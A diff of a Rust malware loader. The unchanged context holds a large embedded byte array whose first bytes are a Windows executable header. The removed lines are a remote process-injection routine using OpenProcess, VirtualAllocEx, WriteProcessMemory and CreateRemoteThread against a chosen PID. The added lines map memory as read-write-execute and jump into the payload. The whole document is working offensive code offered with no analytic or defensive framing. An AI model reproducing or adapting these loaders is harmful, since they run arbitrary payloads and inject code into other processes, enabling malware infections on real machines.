@@ -14822,77 +14822,35 @@ const buf: [u8; 177734] = [0x4d,0x5a,0xe8,0x00,0x00,0x00,0x00,
 
 
 
-const p_ptr: *const c_void = buf.as_ptr() as *const c_void;
-const p_len: usize = buf.len();
-
-fn inject(pid: u32, payload_prt: *const c_void, payload_len: usize) {
-    unsafe {
-        let open = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
-
-        match open {
-            0 => {
-                println!("Failed to open process");
-            }
-            _ => {
-                let remote_mem_ptr = VirtualAllocEx(open, std::ptr::null_mut(), payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-                if !remote_mem_ptr.is_null() {
-                    println!("Memory allocated in remote process");
-                    let write_process = WriteProcessMemory(open, remote_mem_ptr, payload_prt, payload_len, std::ptr::null_mut());
-
-                    match write_process {
-                        0 => {
-                            println!("Failed to write memory in remote process");
-                        }
-                        _ => {
-
-                            let remote_thread = CreateRemoteThread(open, std::ptr::null_mut(), 0, transmute(remote_mem_ptr), std::ptr::null_mut(), 0, std::ptr::null_mut());
-
-                            match remote_thread {
-                                0 => {
-                                    println!("Failed to create remote thread");
-                                }
-                                _ => {
-                                    println!("Remote thread created");
-                                    println!("Payload executed in remote process");
-                                }
-                            }
-                            println!("Memory written in remote process");
-                        }
-                        
-                    }
-
-                } else {
-                    println!("Failed to allocate memory in remote process");
-                    
-                }
-                println!("Process opened");
-            }
-            
-        }
-    }
-
-}
-
-
-
-fn main() {
-
-    let pid = 0x00000000; // Enter the PID of the process you want to inject the payload into
-
-    let args: Vec<String> = env::args().collect();
-    if args.len() < 2 {
-        eprintln!("Usage: {} <pid>", args[0]);
-        std::process::exit(1);
-    }
-
-    let pid = match args[1].parse::<u32>() {
-        Ok(n) => n,
-        Err(_) => {
-            eprintln!("Invalid PID: {}", args[1]);
-            std::process::exit(1);
-        }
+fn execute_payload(payload: &[u8]) {
+    // Allocate executable memory for the payload
+    let exec_mem = unsafe {
+        libc::mmap(
+            std::ptr::null_mut(),
+            payload.len(),
+            libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
+            libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
+            -1,
+            0,
+        )
     };
 
-    inject(pid, p_ptr, p_len);
+    if exec_mem == libc::MAP_FAILED {
+        eprintln!("Failed to allocate executable memory");
+        return;
+    }
+
+    unsafe {
+        // Copy the payload into the allocated memory
+        ptr::copy_nonoverlapping(payload.as_ptr(), exec_mem as *mut u8, payload.len());
+
+        // Cast the memory to a function pointer and call it
+        let func: extern "C" fn() = std::mem::transmute(exec_mem);
+        func();
+    }
+}
+
+fn main() {
+    println!("Executing payload...");
+    execute_payload(&buf);
 }
